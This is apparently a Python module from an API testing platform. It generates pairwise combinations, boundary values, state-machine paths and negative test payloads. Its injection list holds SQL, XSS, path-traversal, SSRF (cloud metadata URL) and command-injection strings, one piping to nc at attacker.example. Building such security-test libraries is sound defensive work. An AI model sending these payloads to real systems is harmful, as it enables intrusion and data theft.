"""方法库四生成器 + 规则注入（25 号文环节5 步骤2-3 + §7 用户规则）。

**纯函数层**：不 import tortoise / LLM / DB / IO。只 import
``testing_platform.design.transform_table``（只读复用其变换表口径与注入载荷）
与 ``testing_platform.generation.rules``（规则渲染）——两者同为纯函数模块。
调用方（编排器 / 子 agent 提示词构建）负责把 DB 行取成 dict 再喂进来。

定位（24 号文 §4「方法库=可执行生成器」）
--------------------------------------
方法库条目不是"方法说明文"，而是**可执行生成器**——每条带输入→输出规程
（qaskills 四生成器口径，skill-library-research R5）。本模块落位四个：

============== ================================== ==========================================
生成器         输入                               输出
============== ================================== ==========================================
pairwise       参数表（每参数一组值）              全对（all-pairs）覆盖代表组合
boundary-value 参数 schema（type/min/max/enum）    边界变体（复用变换表口径 + 分页/限流两轴）
negative       类别名                             负向载荷列表
state-machine  状态集 + 迁移表                    测试路径（全状态/全迁移/守卫/非法迁移）
============== ================================== ==========================================

boundary / negative 与 ``design.transform_table`` **合并不重造**：

- 边界变体口径沿用 ``TRANSFORMS_BY_TYPE``，值也由 ``param_variants`` 现算
  （本模块只在结果上**增补**——min/max 本体与分页/限流两轴，R5：「分页与限流
  边界是我们没有的轴」）；
- 注入载荷沿用 ``INJECTION_SAMPLES``（前 3 条逐字一致），按 R5 类别补齐。

规则注入
--------
``inject_rules_block(prompt, rules)`` 直接调
:func:`testing_platform.generation.rules.render_rules_block`——"未声明=违规"
的英文指令（``DECLARATION_INSTRUCTION``）已在 rules 模块里写死，本模块不重写、
不改写（25 §7 三坑规避：不退化自由文本）。

对外表面::

    from testing_platform.generation.method_lib import (
        SURFACE_RECIPES, recipe_for_surface,
        pairwise_combinations, boundary_values, negative_payloads,
        state_machine_paths, inject_rules_block,
    )
"""
from __future__ import annotations

from typing import Any, Iterable, Mapping, Sequence

from ..design.transform_table import (
    INJECTION_SAMPLES,
    OVERLONG_SAMPLE,
    normalize_type,
    param_variants,
)
from .rules import render_rules_block

__all__ = [
    "SURFACE_RECIPES",
    "SURFACE_ORDER",
    "STRATEGY_LABELS",
    "NEGATIVE_CATEGORIES",
    "recipe_for_surface",
    "pairwise_combinations",
    "boundary_values",
    "negative_payloads",
    "state_machine_paths",
    "inject_rules_block",
]


# ═══════════════════════════════════════════════════════════════════
# §环节5 步骤2 · 六策略 + 端配方
# ═══════════════════════════════════════════════════════════════════

#: 六策略（25 号文环节5 步骤2 原文："正向/反向/边界值/等价类/场景法/状态与流程，A 原文"）。
#: ``id`` 用于提示词与回执；``label`` 取文档中文原文。
STRATEGY_LABELS: dict[str, str] = {
    "positive": "正向",
    "negative": "反向",
    "boundary": "边界值",
    "equivalence": "等价类",
    "scenario": "场景法",
    "state_transition": "状态与流程",
}

#: 端枚举顺序（§2.2 ``mc_test_testpoint.surfaces`` 同序；提示词渲染 / 前端 chips 用）
SURFACE_ORDER: tuple[str, ...] = ("api", "web", "app", "security")

#: 端配方（环节5 步骤2「单独设计断言」+ 24 号文 §3 端专属 body）。
#:
#: 每端四键（构建用例提示词尾部时**按端注入**）：
#:
#: - ``strategies``：六策略子集（该端适用哪些）。api/web/app 为全六策略——
#:   25 号文环节5 步骤2 原文「子 agent 内部：六策略显式过一遍」；security 端
#:   **收窄为四策略**（去掉 positive/scenario）：安全端是横切端（24 号文 §3
#:   「横切，可与 api 叠加」），正向/业务场景由被叠加的 api 端配方承担
#:   （api 必出 C01/C02），安全端聚焦"拒绝/审计/不可见"的反向面。
#:   端差异化落在断言层与必出轴（见下）；端配方页要再裁剪，改这张表即可。
#: - ``assertion_layers``：该端断言层（25 号文原文——api 四层含响应时间 /
#:   web 元素·文案·URL / app 前台态·持久化态·崩溃日志 / security 拒绝码·审计·不可见）。
#: - ``mandatory_axes``：该端**必出**覆盖轴（环节3「接口方向必出 C12/C03/C04」的端化；
#:   security 补 C04+C14——安全端权限与安全约束恒覆盖）。
#: - ``data_scopes_hint``：数据五作用域（§2.7 归位提示）。
#:
#: 断言层字面量与 ``gates.py``（机器门）、``design/transform_table.py``（C01-C14）
#: 同源——提示词尾部与机器判定用同一套词，不让 AI 猜。
SURFACE_RECIPES: dict[str, dict[str, Any]] = {
    "api": {
        "label": "接口端",
        "strategies": [
            "positive", "negative", "boundary", "equivalence",
            "scenario", "state_transition",
        ],
        "assertion_layers": [
            "status_code", "biz_code", "key_fields", "response_time",
        ],
        "mandatory_axes": ["C01", "C02", "C03", "C04", "C11", "C12"],
        "data_scopes_hint": "env/auth/local/data/global",
        # Skill15 必覆盖（25 号文环节5 步骤2；判定见 gates.MANDATORY_API_SCENARIOS）
        "mandatory_scenarios": ["token_invalid", "cross_tenant"],
    },
    "web": {
        "label": "Web 端",
        "strategies": [
            "positive", "negative", "boundary", "equivalence",
            "scenario", "state_transition",
        ],
        "assertion_layers": [
            "element_visible", "element_text", "url",
        ],
        "mandatory_axes": ["C01", "C02", "C03", "C12"],
        "data_scopes_hint": "env/auth/local/data/global",
        "mandatory_scenarios": [],
    },
    "app": {
        "label": "移动端",
        "strategies": [
            "positive", "negative", "boundary", "equivalence",
            "scenario", "state_transition",
        ],
        "assertion_layers": [
            "foreground_state", "persisted_state", "crash_log",
        ],
        "mandatory_axes": ["C01", "C02", "C03", "C12"],
        "data_scopes_hint": "env/auth/local/data/global",
        "mandatory_scenarios": [],
    },
    "security": {
        "label": "安全端",
        "strategies": [
            "negative", "boundary", "equivalence", "state_transition",
        ],
        "assertion_layers": [
            "reject_code", "audit_trail", "data_invisible",
        ],
        "mandatory_axes": ["C04", "C14"],
        "data_scopes_hint": "env/auth/local/data/global",
        "mandatory_scenarios": [],
    },
}

#: surface 别名（容忍调用方写法；前端 chips / 导入脚本可能给别的写法）
_SURFACE_ALIASES: dict[str, str] = {
    "mobile": "app", "app-client": "app", "android": "app", "ios": "app",
    "h5": "web", "browser": "web",
    "safety": "security", "sec": "security", "secops": "security",
}


def recipe_for_surface(surface: str) -> dict:
    """返回该端配方（``SURFACE_RECIPES[surface]`` 的拷贝——列表值已深拷一层）。

    - 大小写 / 空白 / 常见别名容错（``" API "``、``"mobile"``、``"h5"`` …）；
    - 未知端 → ``KeyError``（**不静默回落到 api**——端配方错配会让整批用例的
      断言层写歪，宁可让调用方显式报错）。
    """
    key = str(surface or "").strip().lower()
    key = _SURFACE_ALIASES.get(key, key)
    try:
        recipe = SURFACE_RECIPES[key]
    except KeyError:
        raise KeyError(
            f"未知 surface={surface!r}（合法：{'|'.join(SURFACE_ORDER)}）"
        ) from None
    # 深拷一层列表：调用方（提示词拼装/端配方页）常就地改，不能回头污染常量
    return {k: (list(v) if isinstance(v, list) else v) for k, v in recipe.items()}


# ═══════════════════════════════════════════════════════════════════
# §方法库 · 生成器一：pairwise（全对覆盖）
# ═══════════════════════════════════════════════════════════════════


def _param_values(param: Mapping[str, Any]) -> tuple[str, list[Any]]:
    """一个参数说明 → ``(参数名, 值列表)``。

    值的来源（按优先级）：``values`` → ``examples`` → ``enum`` / ``enum_values``
    → 单值兜底 ``example`` / ``default``。**保序去重**（同值只留首个）。
    """
    name = str(param.get("name") or param.get("param") or "").strip()
    raw = param.get("values")
    if raw is None:
        raw = param.get("examples")
    if raw is None:
        raw = param.get("enum") or param.get("enum_values")
    if raw is None:
        single = param.get("example", param.get("default"))
        raw = [] if single is None else [single]
    if not isinstance(raw, (list, tuple)):
        raw = [raw]
    seen: set[str] = set()
    values: list[Any] = []
    for v in raw:
        k = repr(v)
        if k not in seen:
            seen.add(k)
            values.append(v)
    return name, values


def pairwise_combinations(params: Sequence[Mapping[str, Any]]) -> list[dict]:
    """参数表 → 全对（all-pairs / 2-way）覆盖组合。**贪心算法，不爆 m^n。**

    输入：参数表（每项 ``{name, values|examples|enum, ...}``）。
    输出：组合列表，每项::

        {"values": {参数名: 值, ...},          # 一条可直接执行的完整参数集
         "pairs": [[[名i, 值i], [名j, 值j]], ...]}  # 本条组合覆盖的参数值对

    算法（IPOG 式三阶段，全程确定性——无随机、无集合序依赖）：

    1. **水平扩展**：参数按值数降序排序后逐个并入；为每个已有组合挑一个覆盖
       未覆盖对最多的取值（并列时选"本参数用得最少"的值，避免取值扎堆）；
    2. **垂直扩展**：水平扩展后仍未被覆盖的 ``(参数i 值, 参数j 值)`` 对，
       各补一条只含这两个参数取值的新组合；
    3. **补齐 + 去重**：未赋值参数按首值补齐（组合定长，便于直接执行），
       再去掉重复组合。

    性质（测试直接断言）：3 参数 2-3 值 → 组合数 ≤ 12 且每对参数值都出现；
    组合数 O(值数²×参数数) 级别，远小于全组合 ``m^n``。

    单值参数（只有 example/default）只有 1 个值——不产生配对压力，作固定值
    并入组合；名字重复 → ``ValueError``（参数表写歪，不静默取其一）。
    """
    names: list[str] = []
    domains: list[list[Any]] = []
    for p in params or ():
        if not isinstance(p, Mapping):
            continue
        name, values = _param_values(p)
        if not name or not values:
            continue
        if name in names:
            raise ValueError(f"pairwise 参数名重复：{name!r}（参数表每参数名唯一）")
        names.append(name)
        domains.append(values)

    n = len(names)
    if n == 0:
        return []

    # 排序：值数降序（稳定——同值数保持输入序），确定性
    order = sorted(range(n), key=lambda i: -len(domains[i]))
    o_names = [names[i] for i in order]
    o_domains = [domains[i] for i in order]

    # 覆盖表：(参数序号对) → 已覆盖的 (值序号对) 集合
    covered: dict[tuple[int, int], set[tuple[int, int]]] = {
        (q, pp): set() for q in range(n) for pp in range(q + 1, n)
    }
    rows: list[dict[int, int]] = []

    def _cover_row(row: Mapping[int, int], upto: int) -> None:
        """把 row 里所有 (q, upto) 对记入覆盖表（q < upto）。"""
        for q in range(upto):
            covered[(q, upto)].add((row[q], row[upto]))

    # 种子：第一个参数的每个值各一行
    for vi in range(len(o_domains[0])):
        rows.append({0: vi})

    for pp in range(1, n):
        m = len(o_domains[pp])
        # ── 阶段1：水平扩展（每行选值）──────────────────────────
        used = [0] * m
        for row in rows:
            best_i = 0
            best_key: tuple[int, int, int] | None = None
            for vi in range(m):
                gain = sum(
                    1 for q in range(pp) if (row[q], vi) not in covered[(q, pp)]
                )
                key = (-gain, used[vi], vi)
                if best_key is None or key < best_key:
                    best_key, best_i = key, vi
            row[pp] = best_i
            used[best_i] += 1
            _cover_row(row, pp)
        # ── 阶段2：垂直扩展（补未覆盖对）────────────────────────
        for vi in range(m):
            for q in range(pp):
                for u in range(len(o_domains[q])):
                    if (u, vi) in covered[(q, pp)]:
                        continue
                    new_row: dict[int, int] = {q: u, pp: vi}
                    rows.append(new_row)
                    covered[(q, pp)].add((u, vi))
        # ── 阶段3a：补齐未赋值参数（首值）────────────────────────
        for row in rows:
            for k in range(pp + 1):
                if k not in row:
                    row[k] = 0
            _cover_row(row, pp)

    # ── 阶段3b：去重（补齐后可能撞车）─────────────────────────
    seen: set[tuple[int, ...]] = set()
    uniq: list[dict[int, int]] = []
    for row in rows:
        key = tuple(row[k] for k in range(n))
        if key in seen:
            continue
        seen.add(key)
        uniq.append(row)

    # ── 输出：键按原参数顺序重排，附本条覆盖的参数值对 ──────────
    out: list[dict] = []
    for row in uniq:
        values = {o_names[k]: o_domains[k][row[k]] for k in range(n)}
        pairs = [
            [[o_names[q], o_domains[q][row[q]]], [o_names[pp], o_domains[pp][row[pp]]]]
            for q in range(n) for pp in range(q + 1, n)
        ]
        out.append({"values": values, "pairs": pairs})
    return out


# ═══════════════════════════════════════════════════════════════════
# §方法库 · 生成器二：boundary-value（边界变体）
# ═══════════════════════════════════════════════════════════════════

#: 参数名命中分页轴（页码 / 偏移）
_PAGINATION_PARAM_HINTS: frozenset[str] = frozenset({
    "page", "page_no", "pageno", "page_num", "pagenum", "pagenumber", "page_number",
    "offset", "current", "pn",
})

#: 参数名命中每页大小轴
_PAGE_SIZE_PARAM_HINTS: frozenset[str] = frozenset({
    "page_size", "pagesize", "size", "limit", "per_page", "perpage", "pagecount",
})

#: 参数名命中限流轴（速率 / 批量）
_RATE_LIMIT_PARAM_HINTS: frozenset[str] = frozenset({
    "qps", "rate", "rate_limit", "ratelimit", "batch_size", "batchsize",
    "concurrency", "max_size",
})

#: 分页/每页大小轴会**接管**的通用数值探测变体（transform_table 口径）。
#: 原因：分页轴对同一输入有更精确的语义与预期（如超大页码→空结果 200，通用数值
#: 探测给 400 是矛盾断言）；命中分页轴即由专用变体接管，避免"同值双测 / 断言打架"。
_PAGINATION_SUPERSEDES: frozenset[str] = frozenset({
    "zero", "negative", "non-numeric", "min-1", "max+1",
})

#: 分页轴固定变体：``(variant, label, expect_status, axis)``
_PAGINATION_VARIANTS: tuple[tuple[str, str, int, str], ...] = (
    ("page-zero", "页码 0（多数接口视为越界）", 400, "C12"),
    ("page-negative", "负页码", 400, "C12"),
    ("page-non-numeric", "非数字页码", 400, "C12"),
    ("page-over-max", "超大页码（越界→空结果）", 200, "C03"),
)

#: 每页大小轴固定变体
_PAGE_SIZE_VARIANTS: tuple[tuple[str, str, int, str], ...] = (
    ("page-size-zero", "每页 0 条", 400, "C12"),
    ("page-size-negative", "负每页条数", 400, "C12"),
    ("page-size-one", "每页 1 条（最小合法）", 200, "C03"),
    ("page-size-over-max", "每页超上限", 400, "C03"),
)

#: 限流轴固定变体（R5：限流边界；C05 并发轴）
_RATE_LIMIT_VARIANTS: tuple[tuple[str, str, int, str], ...] = (
    ("rate-burst", "突发超出限额（短时脉冲）", 429, "C05"),
    ("rate-sustained", "持续压过限额（稳态超频）", 429, "C05"),
)

#: 补轴变体的确定性载荷（不让 AI 现造）
_EXTRA_VALUE: dict[str, Any] = {
    "page-zero": 0,
    "page-negative": -1,
    "page-non-numeric": "abc",
    "page-over-max": 999999,
    "page-size-zero": 0,
    "page-size-negative": -1,
    "page-size-one": 1,
    "page-size-over-max": 10000,
    "rate-burst": "__burst__",       # 并发/突发由执行侧策略承载，值仅作标记
    "rate-sustained": "__sustained__",
}


def _param_kind(param: Mapping[str, Any]) -> str:
    """参数的变换键：有枚举值走 enum，否则按归一类型（与 transform_table 同口径）。"""
    if param.get("enum_values") or param.get("enum"):
        return "enum"
    t = normalize_type(param.get("type"))
    if param.get("required") and not t:
        return "required"
    return t or "string"


def _min_max(param: Mapping[str, Any]) -> tuple[Any, Any]:
    """从参数说明抽 min/max（顶层或 schema 约束键；与 transform_table 同口径）。"""
    return (
        param.get("min_value", param.get("minimum")),
        param.get("max_value", param.get("maximum")),
    )


def boundary_values(param_spec: Mapping[str, Any]) -> list[dict]:
    """参数 schema → 边界变体列表。

    输入：``mc_test_api.params[]`` 一项（或 request_body 顶层属性）——
    ``{name, in, type, required, min_value/max_value, enum_values, ...}``。
    输出每项：``{variant, axis, expect_status, label, value, param}``——**字段与
    :func:`~testing_platform.design.transform_table.param_variants` 完全一致**
    （同一路调用方可混用）。

    **复用不重造**：基础变体直接 ``param_variants(param_spec)``（口径 =
    ``TRANSFORMS_BY_TYPE``，值现算）；本模块只在其上**增补**：

    1. ``min`` / ``max`` 本体命中（transform_table 只有 ``min-1`` / ``max+1``，
       缺边界值本体——本模块补，仅当 schema 给了 min/max）；
    2. **分页 / 每页大小 / 限流三轴**（R5：transform_table 没有的轴）——按
       ``name`` 命中参数名即叠加。命中分页/每页大小轴时，通用数值探测
       （zero/negative/non-numeric/min-1/max+1）**由专用变体接管**（见
       ``_PAGINATION_SUPERSEDES`` 的注解）。

    ``expect_status``：正常档 200、异常档 400（字段校验）/415（形态）/429（限流）
    ——与 transform_table 的 status_code 层同口径；biz_code / key_fields 由
    AI / 规则补。
    """
    if not isinstance(param_spec, Mapping):
        return []
    name = str(param_spec.get("name") or "").strip()
    if not name:
        return []

    kind = _param_kind(param_spec)
    lowered = name.lower()
    is_page = lowered in _PAGINATION_PARAM_HINTS
    is_size = lowered in _PAGE_SIZE_PARAM_HINTS
    is_rate = lowered in _RATE_LIMIT_PARAM_HINTS

    # ── 基础变体（复用变换表口径）─────────────────────────────
    out: list[dict] = list(param_variants(param_spec))
    if is_page or is_size:
        out = [v for v in out if v["variant"] not in _PAGINATION_SUPERSEDES]

    # ── 增补1：min / max 本体（仅数值类型且 schema 给了界）──────
    if kind in ("integer", "number"):
        lo, hi = _min_max(param_spec)
        if isinstance(lo, (int, float)):
            out.append({
                "variant": "min", "axis": "C03", "expect_status": 200,
                "label": "下边界值", "value": lo, "param": name,
            })
        if isinstance(hi, (int, float)):
            out.append({
                "variant": "max", "axis": "C03", "expect_status": 200,
                "label": "上边界值", "value": hi, "param": name,
            })

    # ── 增补2：分页 / 每页大小 / 限流三轴 ──────────────────────
    extra: list[tuple[str, str, int, str]] = []
    if is_page:
        extra.extend(_PAGINATION_VARIANTS)
    if is_size:
        extra.extend(_PAGE_SIZE_VARIANTS)
    if is_rate:
        extra.extend(_RATE_LIMIT_VARIANTS)
    for variant, label, expect, axis in extra:
        out.append({
            "variant": variant, "axis": axis, "expect_status": expect,
            "label": label, "value": _EXTRA_VALUE.get(variant), "param": name,
        })
    return out


# ═══════════════════════════════════════════════════════════════════
# §方法库 · 生成器三：negative（负向载荷库）
# ═══════════════════════════════════════════════════════════════════

#: 负向类别枚举（R5 的八个内置生成器归并成四类：injection/auth/malformed/concurrency）
NEGATIVE_CATEGORIES: tuple[str, ...] = ("injection", "auth", "malformed", "concurrency")

#: 注入载荷：INJECTION_SAMPLES 前 3 条（逐字一致，合并口径见 24 号文 §4）各归一类
_BASE_INJECTION: tuple[dict[str, str], ...] = (
    {"kind": "sql", "payload": INJECTION_SAMPLES[0]},
    {"kind": "xss", "payload": INJECTION_SAMPLES[1]},
    {"kind": "path_traversal", "payload": INJECTION_SAMPLES[2]},
)

#: 注入载荷扩展：SQL/XSS/path-traversal 各补 1 条（与基线各 1 条合成每类 2 条）
#: + SSRF / command-injection 各 2 条（R5 类别，transform_table 没有）
_EXTRA_INJECTION: tuple[dict[str, str], ...] = (
    {"kind": "sql", "payload": "1; DROP TABLE users--"},
    {"kind": "xss", "payload": "<img src=x onerror=alert(1)>"},
    {"kind": "path_traversal", "payload": "....//....//etc/passwd"},
    {"kind": "ssrf", "payload": "http://169.254.169.254/latest/meta-data/"},
    {"kind": "ssrf", "payload": "http://127.0.0.1:6379/"},
    {"kind": "command_injection", "payload": "; cat /etc/passwd"},
    {"kind": "command_injection", "payload": "| nc attacker.example 4444"},
)

#: 鉴权负向（auth-bypass / expired-token / cross-tenant / no-token；轴 C04）
_AUTH_PAYLOADS: tuple[dict[str, str], ...] = (
    {"kind": "auth_bypass", "payload": "Bearer invalid-signature-token",
     "label": "伪造签名 token", "expect_status": "401"},
    {"kind": "auth_bypass", "payload": "alg=none 的未签名 JWT",
     "label": "未签名 JWT", "expect_status": "401"},
    {"kind": "expired_token", "payload": "__expired_token__",
     "label": "过期 token", "expect_status": "401"},
    {"kind": "expired_token", "payload": "已登出 / 已撤销的 session",
     "label": "已撤销会话", "expect_status": "401"},
    {"kind": "cross_tenant", "payload": "__other_tenant_id__",
     "label": "越权访问他租户资源", "expect_status": "403"},
    {"kind": "cross_tenant", "payload": "低权限角色调高权限接口",
     "label": "越权角色", "expect_status": "403"},
    {"kind": "no_token", "payload": "__no_token__",
     "label": "完全无 token", "expect_status": "401"},
    {"kind": "no_token", "payload": "空 Authorization 头",
     "label": "空 Authorization 头", "expect_status": "401"},
)

#: 畸形请求（bad-json / wrong-content-type / oversized；轴 C12）
_MALFORMED_PAYLOADS: tuple[dict[str, str], ...] = (
    {"kind": "bad_json", "payload": '{"a": }',
     "label": "残缺 JSON", "expect_status": "400"},
    {"kind": "bad_json", "payload": "{not-json-at-all}",
     "label": "非 JSON 文本", "expect_status": "400"},
    {"kind": "wrong_content_type", "payload": "text/plain 提交 JSON 体",
     "label": "Content-Type 错配", "expect_status": "415"},
    {"kind": "wrong_content_type", "payload": "multipart/form-data 提交 JSON 接口",
     "label": "表单提交 JSON 接口", "expect_status": "415"},
    {"kind": "oversized", "payload": OVERLONG_SAMPLE,
     "label": "超长请求体", "expect_status": "413"},
    {"kind": "oversized", "payload": "超过上游限额的大字段",
     "label": "超限大字段", "expect_status": "400"},
)

#: 并发冲突（race / duplicate-submit；轴 C05 / C11）
_CONCURRENCY_PAYLOADS: tuple[dict[str, str], ...] = (
    {"kind": "race", "payload": "同资源并发读写（读-改-写竞态）",
     "label": "读写竞态", "expect_status": "409"},
    {"kind": "race", "payload": "并行扣减同一余额",
     "label": "并发扣减", "expect_status": "409"},
    {"kind": "duplicate_submit", "payload": "重复提交同一请求（同幂等键）",
     "label": "重复提交", "expect_status": "409"},
    {"kind": "duplicate_submit", "payload": "双击 / 重发导致的二次创建",
     "label": "二次创建", "expect_status": "409"},
)

#: 载荷子类 → 覆盖轴
_NEGATIVE_AXIS: dict[str, str] = {
    "sql": "C14", "xss": "C14", "path_traversal": "C14",
    "ssrf": "C14", "command_injection": "C14",
    "auth_bypass": "C04", "expired_token": "C04",
    "cross_tenant": "C04", "no_token": "C04",
    "bad_json": "C12", "wrong_content_type": "C12", "oversized": "C12",
    "race": "C05", "duplicate_submit": "C11",
}

#: 类别别名归一
_NEGATIVE_ALIASES: dict[str, str] = {
    "injection": "injection", "sql-injection": "injection", "xss": "injection",
    "inject": "injection", "sqli": "injection",
    "auth": "auth", "authentication": "auth", "authorization": "auth",
    "authz": "auth", "permission": "auth",
    "malformed": "malformed", "malformed-request": "malformed",
    "bad-request": "malformed", "fuzz": "malformed",
    "concurrency": "concurrency", "concurrent": "concurrency",
    "race": "concurrency", "duplicate": "concurrency",
}


def negative_payloads(category: str) -> list[dict]:
    """按类别返回负向载荷。

    ``category`` 合法值：``injection`` / ``auth`` / ``malformed`` / ``concurrency``
    （大小写 / 别名容错，见 ``_NEGATIVE_ALIASES``；未知类别 → ``ValueError``）。

    输出每项：``{category, payload, label, axis, expect_status}``。

    - **injection**：SQL / XSS / path-traversal / SSRF / command-injection 各 2 条
      ——SQL/XSS/path-traversal 首条与 ``transform_table.INJECTION_SAMPLES``
      逐字一致（合并口径），另补 SSRF 与 command-injection；
    - **auth**：auth-bypass / expired-token / cross-tenant / no-token（各 2 条）；
    - **malformed**：bad-json / wrong-content-type / oversized（各 2 条）；
    - **concurrency**：race / duplicate-submit（各 2 条）。
    """
    key = str(category or "").strip().lower().replace("_", "-").replace(" ", "-")
    key = _NEGATIVE_ALIASES.get(key, key)
    if key not in NEGATIVE_CATEGORIES:
        raise ValueError(
            f"未知负向类别={category!r}（合法：{'|'.join(NEGATIVE_CATEGORIES)}）"
        )

    if key == "injection":
        raw: list[dict[str, str]] = [dict(x) for x in _BASE_INJECTION + _EXTRA_INJECTION]
    elif key == "auth":
        raw = [dict(x) for x in _AUTH_PAYLOADS]
    elif key == "malformed":
        raw = [dict(x) for x in _MALFORMED_PAYLOADS]
    else:
        raw = [dict(x) for x in _CONCURRENCY_PAYLOADS]

    out: list[dict] = []
    for item in raw:
        kind = item["kind"]
        out.append({
            "category": kind,
            "payload": item["payload"],
            "label": item.get("label") or kind,
            "axis": _NEGATIVE_AXIS.get(kind, "C02"),
            "expect_status": int(item.get("expect_status", 400)),
        })
    return out


# ═══════════════════════════════════════════════════════════════════
# §方法库 · 生成器四：state-machine（状态迁移路径）
# ═══════════════════════════════════════════════════════════════════

#: 迁移 dict 的键名别名（容忍不同来源写法）
_FROM_KEYS = ("from", "source", "src", "from_state", "current")
_TO_KEYS = ("to", "target", "dst", "to_state", "next")
_EVENT_KEYS = ("event", "trigger", "action", "on")
_GUARD_KEYS = ("guard", "condition", "when", "precondition")


def _pick(mapping: Mapping[str, Any], keys: Sequence[str]) -> Any:
    for k in keys:
        if k in mapping and mapping[k] not in (None, ""):
            return mapping[k]
    return None


def state_machine_paths(
    states: Sequence[str],
    transitions: Sequence[Mapping[str, Any]],
) -> list[dict]:
    """状态机 → 测试路径（R5 state-machine-test-generator 口径）。

    输入：

    - ``states``：状态名列表；
    - ``transitions``：迁移表，每项 ``{from|source, to|target, event?, guard?}``
      （键名容错；指向未声明状态 / 缺 from/to 的项直接跳过——不产脏路径）。

    输出每项一条路径::

        {
          "kind": "all_states" | "all_transitions" | "guard_blocked" | "illegal_transition",
          "path": [状态...],          # 路径（all_states 是单状态探针 [s]）
          "from": str | None,
          "to": str | None,
          "event": str | None,
          "guard": str | None,
          "expect": "reachable" | "blocked" | "unreachable",
          "axis": "C13" | "C02",
          "label": str,
        }

    四类覆盖（R5 原文 + 25 号文 2.2「状态迁移」design_method）：

    1. **all-states**：每个状态一条路径（``[s]``——到达并断言处于该状态）。
       **不做跨状态拼接**：把所有状态串成一条路径会在非相邻状态间断言一条
       非法迁移（如 ``draft → done``），产生假用例；"到达某状态"的走法由
       all-transitions 路径提供，本类只负责"每个状态都被探到一次"；
    2. **all-transitions**：每条合法迁移一条路径（``[from, to]``，expect=reachable）；
    3. **guard_blocked**：带守卫（guard）的迁移额外一条"守卫不满足"路径
       （R5：守卫条件测试）；
    4. **关键非法迁移**：不在迁移表里的 ``(from, to)`` 对（含 ``done → draft``
       这类"终态还能往回动"的经典 bug）——expect=unreachable（应被拒绝并
       保持原态）。**完备实现为全量非法对**（小状态机规模下条目可控；如需裁剪
       由端配方 / 调用方按批次筛）。
    """
    state_list = [str(s).strip() for s in (states or ()) if str(s or "").strip()]
    state_set = set(state_list)
    if not state_set:
        return []

    # ── 归一迁移表 ────────────────────────────────────────────
    edges: list[dict] = []
    legal: set[tuple[str, str]] = set()
    for t in transitions or ():
        if not isinstance(t, Mapping):
            continue
        src = _pick(t, _FROM_KEYS)
        dst = _pick(t, _TO_KEYS)
        if src is None or dst is None:
            continue
        src, dst = str(src).strip(), str(dst).strip()
        if src not in state_set or dst not in state_set:
            continue
        edges.append({
            "from": src, "to": dst,
            "event": _pick(t, _EVENT_KEYS),
            "guard": _pick(t, _GUARD_KEYS),
        })
        legal.add((src, dst))

    out: list[dict] = []

    # ① all-states 覆盖（每状态一条"到达并探到该状态"的路径，不跨状态拼接）
    for s in state_list:
        out.append({
            "kind": "all_states",
            "path": [s],
            "from": s,
            "to": s,
            "event": None, "guard": None,
            "expect": "reachable", "axis": "C13",
            "label": f"全状态覆盖：到达并断言处于 {s}",
        })

    # ② all-transitions 覆盖
    for edge in edges:
        label = f"迁移 {edge['from']}→{edge['to']}"
        if edge["event"]:
            label += f"（事件 {edge['event']}）"
        out.append({
            "kind": "all_transitions",
            "path": [edge["from"], edge["to"]],
            "from": edge["from"], "to": edge["to"],
            "event": edge["event"], "guard": edge["guard"],
            "expect": "reachable", "axis": "C13", "label": label,
        })

    # ③ 守卫条件测试（带 guard 的迁移）
    for edge in edges:
        if not edge["guard"]:
            continue
        out.append({
            "kind": "guard_blocked",
            "path": [edge["from"]],
            "from": edge["from"], "to": None,
            "event": edge["event"], "guard": edge["guard"],
            "expect": "blocked", "axis": "C13",
            "label": f"守卫不满足时 {edge['from']} 不发生迁移（guard={edge['guard']}）",
        })

    # ④ 关键非法迁移（全量非法对——含终态出发的 done→draft 这类经典 bug）
    for src in state_list:
        for dst in state_list:
            if dst == src or (src, dst) in legal:
                continue
            out.append({
                "kind": "illegal_transition",
                "path": [src, dst],
                "from": src, "to": dst,
                "event": None, "guard": None,
                "expect": "unreachable", "axis": "C02",
                "label": f"非法迁移 {src}→{dst}（应被拒绝且保持 {src}）",
            })
    return out


# ═══════════════════════════════════════════════════════════════════
# §7 · 规则注入（生成期提示词尾部）
# ═══════════════════════════════════════════════════════════════════


def inject_rules_block(prompt: str, rules: Iterable[Mapping[str, Any]]) -> str:
    """把"本项目规则"块拼到提示词尾部（生成期规则注入）。

    直接调 :func:`testing_platform.generation.rules.render_rules_block`——
    "未声明=违规"的指令（``DECLARATION_INSTRUCTION``）、hard/soft 分节、按
    rule_id 编号全在那个模块写死，本模块**不重写也不改写**（25 §7 三坑规避）。

    - ``prompt`` 为空的字符串 → 只返回规则块（不补前导空行）；
    - ``rules`` 空 → 仍拼上块（render 会输出"当前作用域无生效规则"，但
      回执契约照样生效：**无规则也要声明**）——这是「未声明=违规」的边界情形；
    - 作用域筛选（active/shadow/disabled）由调用方先过
      :func:`~testing_platform.generation.rules.rules_for`；本函数传入什么渲染
      什么（与 ``render_rules_block`` 同口径）。
    """
    block = render_rules_block(list(rules or []))
    base = prompt if isinstance(prompt, str) else str(prompt or "")
    if not base:
        return block
    if base.endswith("\n"):
        return base + "\n" + block
    return base + "\n\n" + block